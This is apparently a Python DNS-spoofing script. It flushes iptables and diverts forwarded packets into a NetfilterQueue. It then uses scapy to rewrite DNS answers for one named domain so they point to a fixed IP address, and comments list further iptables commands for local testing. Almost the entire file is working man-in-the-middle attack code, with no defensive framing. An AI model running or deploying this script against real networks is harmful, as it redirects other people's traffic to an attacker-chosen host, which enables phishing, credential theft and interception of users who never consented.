import netfilterqueue
import scapy.all as scapy
import subprocess


subprocess.call("iptables --flush", shell=True)
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)


# run this cmd command ==> iptables -I FORWARD -j NFQUEUE --queue-num 0

# Below is for testing on local machine
# run this cmd command ==> iptables -I OUTPUT -j NFQUEUE --queue-num 0
# run this cmd command ==> iptables -I INPUT -j NFQUEUE --queue-num 0


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        print(qname)
        if "pateldhruvi.com" in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="18.224.217.145")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

